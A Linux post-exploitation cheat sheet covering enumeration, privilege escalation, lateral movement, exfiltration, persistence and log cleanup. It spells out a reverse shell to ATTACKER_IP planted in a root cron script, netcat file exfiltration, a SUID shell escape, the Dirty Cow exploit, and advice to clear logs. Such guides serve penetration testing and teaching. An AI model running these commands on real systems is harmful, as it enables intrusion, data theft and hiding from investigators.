# Linux Post-Exploitation Techniques

Once initial access is gained on a Linux system, the goal shifts to maintaining access, escalating privileges, and gathering valuable information. This document outlines common techniques and tools used in the post-exploitation phase.

## 1. Initial System Enumeration

Before attempting privilege escalation, it's crucial to understand the system's configuration, running processes, and user privileges.

-   **System Information**: `uname -a`, `cat /etc/os-release`, `hostname`, `df -h`, `mount`
-   **User Information**: `whoami`, `id`, `cat /etc/passwd`, `cat /etc/shadow` (if accessible), `sudo -l`
-   **Network Information**: `ip a`, `netstat -tulnp`, `ss -tulnp`, `cat /etc/resolv.conf`
-   **Running Processes**: `ps aux`, `top`, `htop`
-   **Installed Software**: `dpkg -l` (Debian/Ubuntu), `rpm -qa` (RedHat/CentOS)
-   **Cron Jobs**: `ls -la /etc/cron*`, `cat /etc/crontab`, `crontab -l`
-   **Services**: `systemctl list-units --type=service`, `service --status-all`
-   **Environment Variables**: `env`

## 2. Privilege Escalation

The primary goal is to gain root access. Common methods include:

### 2.1. Kernel Exploits

Exploiting vulnerabilities in the Linux kernel. Requires identifying the kernel version and searching for known exploits.

-   **Identify Kernel Version**: `uname -r`
-   **Search for Exploits**: `searchsploit linux <kernel_version>`, Exploit-DB, CVE databases.
-   **Example (Dirty Cow - CVE-2016-5195)**:
    ```bash
    # Check if vulnerable (kernel < 4.8.0)
    # Download and compile exploit (e.g., from Exploit-DB)
    gcc -pthread dirty.c -o dirty -lcrypt
    ./dirty
    ```

### 2.2. SUID/SGID Binaries

Binaries with SUID (Set User ID) or SGID (Set Group ID) permissions run with the privileges of their owner/group. Misconfigured SUID/SGID binaries can be exploited.

-   **Find SUID/SGID Binaries**: 
    ```bash
    find / -perm -4000 -o -perm -2000 2>/dev/null
    ```
-   **Check GTFOBins**: A curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.
    -   `sudo`, `find`, `nmap`, `vi`, `less`, `more`, `awk`, `nano`, `cp`, `mv`, `tar`, `zip`, `unzip`, `base64`, `chown`, `chmod`, `diff`, `env`, `expand`, `ftp`, `gdb`, `git`, `make`, `mount`, `perl`, `php`, `python`, `ruby`, `ssh`, `strace`, `systemctl`, `wget`, `xxd`, `zsh`.
-   **Example (find SUID exploit)**:
    ```bash
    # If 'find' has SUID bit
    find . -exec /bin/sh -p \; -quit
    ```

### 2.3. Cron Jobs

Scheduled tasks that run at specific intervals. Insecurely configured cron jobs can be exploited if they run scripts with root privileges that are writable by a low-privileged user.

-   **Check Writable Cron Files**: `find /etc/cron* -writable 2>/dev/null`
-   **Check Script Permissions**: Examine scripts executed by cron jobs for weak permissions.
-   **Example (Writable script)**:
    ```bash
    # If a script run by root cron is writable by current user
    echo "/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > /path/to/writable_script.sh
    ```

### 2.4. Weak File Permissions

Misconfigured file and directory permissions can allow a low-privileged user to modify sensitive files or execute arbitrary code.

-   **Search for Writable Files/Directories**: `find / -writable -type f 2>/dev/null`, `find / -writable -type d 2>/dev/null`
-   **Sensitive Files**: `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, SSH keys (`~/.ssh/id_rsa`)

### 2.5. Exploiting Services

Running services might have misconfigurations or vulnerabilities that can lead to privilege escalation.

-   **Database Services**: Weak credentials, insecure configurations (e.g., MySQL UDF injection).
-   **Web Servers**: Outdated versions, misconfigurations.
-   **NFS/SMB Shares**: Misconfigured `no_root_squash` or writable shares.

### 2.6. Password Reuse / Hash Cracking

If password hashes are obtained (e.g., from `/etc/shadow` or `SAM` files), attempt to crack them using tools like John the Ripper or Hashcat. Cracked passwords can be reused for other accounts.

## 3. Lateral Movement

Expanding access to other systems within the network.

-   **SSH Keys**: Look for SSH keys (`~/.ssh/id_rsa`, `/root/.ssh/id_rsa`) that might allow access to other machines.
-   **Network Shares**: Mount and explore NFS/SMB shares for sensitive data or further access.
-   **Internal Network Scanning**: Use tools like `nmap` (if available or transferred) or `netcat` to scan internal networks from the compromised host.
-   **Proxying Traffic**: Set up SOCKS proxies (e.g., with `ssh -D`) to route traffic through the compromised host to internal networks.

## 4. Data Exfiltration

Extracting sensitive data from the compromised system.

-   **Direct Transfer**: `scp`, `sftp`, `wget`, `curl`.
-   **Netcat**: `nc -lvnp 4444 > exfiltrated_data.zip` (on attacker) and `nc ATTACKER_IP 4444 < sensitive_file.zip` (on target).
-   **DNS Exfiltration**: Encoding data into DNS queries.
-   **HTTP/HTTPS Tunneling**: Using tools like `chisel` or `iodine`.

## 5. Persistence

Maintaining access to the system even after reboots or security measures are implemented.

-   **Cron Jobs**: Add malicious entries to `/etc/crontab` or user-specific crontabs.
-   **Startup Scripts**: Modify `/etc/rc.local`, `/etc/init.d/`, `systemd` units.
-   **SSH Authorized Keys**: Add attacker's public key to `~/.ssh/authorized_keys`.
-   **Rootkits**: Install stealthy backdoors.
-   **Malicious Binaries**: Replace legitimate binaries with malicious ones (e.g., `bash`, `login`).

## 6. Cleanup

Removing traces of the intrusion to avoid detection.

-   **Clear Logs**: `/var/log/auth.log`, `/var/log/syslog`, `~/.bash_history`.
-   **Remove Malicious Files**: Delete any transferred exploits or scripts.
-   **Restore Modified Files**: Revert changes made to configuration files.
